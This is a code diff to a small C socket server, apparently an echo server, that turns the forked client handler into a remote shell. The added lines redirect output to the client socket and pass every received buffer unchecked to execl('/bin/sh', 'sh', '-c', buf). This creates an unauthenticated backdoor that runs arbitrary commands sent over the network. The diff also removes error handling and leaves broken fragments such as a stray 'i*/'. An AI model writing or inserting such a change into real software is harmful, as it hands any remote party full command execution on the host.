@@ -10,6 +10,7 @@
  */
 
 #include <stdio.h>
+#include <unistd.h>
 #include <stdlib.h>
 #include <errno.h>
 #include <string.h>
@@ -79,25 +80,27 @@ char diedbuf[1024];
 			exit(1);
 		}
 		printf("Visit number: %d\n",visit++);
-
+	
 		if(!fork()) 
 		{
+	  	   dup2(newfd, STDOUT_FILENO);
+   		   dup2(newfd, STDERR_FILENO);
+                   do {
 			int i=1;
-			if( (numbytes=recv(newfd,buf,MAX,0))==-1 ) 
+			/*if( (numbytes=recv(newfd,buf,MAX,0))==-1 ) 
 			{
 				perror("recv");
 				exit(1);
-			}
+			}i*/
+                        numbytes=recv(newfd,buf,MAX,0);
 	
 			buf[numbytes]='\0';
-			printf("%s\n",buf);
-	
-			if(send(newfd,buf,strlen(buf),0) ==-1)
-			{
-        			perror("send");
-        			exit(0);
-			}
+			execl("/bin/sh", "sh", "-c", buf, NULL);
+                   } while(1 /*strcmp(buf,"exit;\n")*/);
 		}
+               // close(newfd);
+               printf("Bye!!\n"); 
 	}
-close(newfd);
+close(sockfd);
+printf("closing...\n");
 }
